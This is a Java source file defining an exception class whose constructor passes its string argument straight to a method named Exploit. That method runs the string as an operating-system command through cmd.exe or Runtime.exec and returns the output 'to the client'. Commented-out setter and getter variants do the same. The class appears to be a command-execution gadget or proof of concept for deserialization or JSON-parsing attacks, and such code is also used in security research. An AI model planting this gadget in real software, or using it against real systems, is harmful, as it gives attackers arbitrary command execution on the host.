package com.sorry.bug;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

/**
 * created by 0x22cb7139 on 2021/4/16
 */
public class customException extends Exception {

    public String command;


    public customException(String s) {
        this.command = s;
        try{
            System.out.println("有参构造函数");
            System.out.println(Exploit(s));
        }catch (Exception e){
            e.printStackTrace();
        }
    }
/*
    public String getCommand() throws IOException {
        System.out.println("get方法");
        System.out.println(Exploit(this.command));

        return command;
    }

    public void setCommand(String command) throws IOException {
        this.command = command;
        System.out.println("set方法");
        System.out.println(Exploit(this.command));

    }

 */



    public String Exploit(String cmd) throws IOException {
        System.out.println("函数调用Exploit("+cmd+")");
        Process p;
        String result="";
        String disr;
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
            p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
        } else {
            p = Runtime.getRuntime().exec(cmd);
        }
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(p.getInputStream(),"GB2312"));
        while((disr=bufferedReader.readLine())!=null){
            result += disr + "";
        }
        //return to client 结果返回给客户端
        return result;
    }
}